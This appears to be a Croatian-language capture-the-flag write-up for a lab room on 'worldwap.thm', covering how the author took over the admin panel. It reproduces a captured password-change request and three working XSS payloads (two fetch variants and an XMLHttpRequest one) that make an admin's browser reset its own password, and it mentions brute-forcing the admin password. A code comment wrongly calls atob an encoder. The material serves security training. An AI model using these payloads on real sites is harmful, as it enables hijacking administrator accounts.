Generalno imao sam problema samo sa dobivanjem admin panela, jer se nisam sjetio da mogu poslati neki request preko admina.

Uspio sam rjesiti sobu preko broute forcanja admin sifre, no pretpostavljam da to nije bio predviđeni nacin, tako da sam napisao XMLHttpRequest.
Kada imamo ovakav request:
POST /change_password.php HTTP/1.1
Host: login.worldwap.thm
Content-Length: 17
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://login.worldwap.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://login.worldwap.thm/change_password.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=398e9lc6fakuu5bmpd32k77i5t
Connection: keep-alive

new_password=meme


Trebamo ga pretvoriti u nekako u <script> i to dobivamo ovako koristeci fetch:
Ovaj primjer ne radi zbog CORS protekcije.
<script>fetch('http://login.worldwap.thm/change_password.php',{method:'POST',body:'new_password=meme',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>

No ovaj ce raditi:
<script>fetch('/change_password.php',{method:'POST',body:'new_password=meme',headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>
Ili mozemo preko XHR:
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('L2NoYW5nZV9wYXNzd29yZC5waHA='), true); //atob samo base64 enkodira, mozemo ostaviti i plantext, TAKOĐER ISTO MORA BITI SAMO /change_password.php
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    console.log("Radi");
  }
};
xhr.send('action=execute&new_password=meme2');
</script>
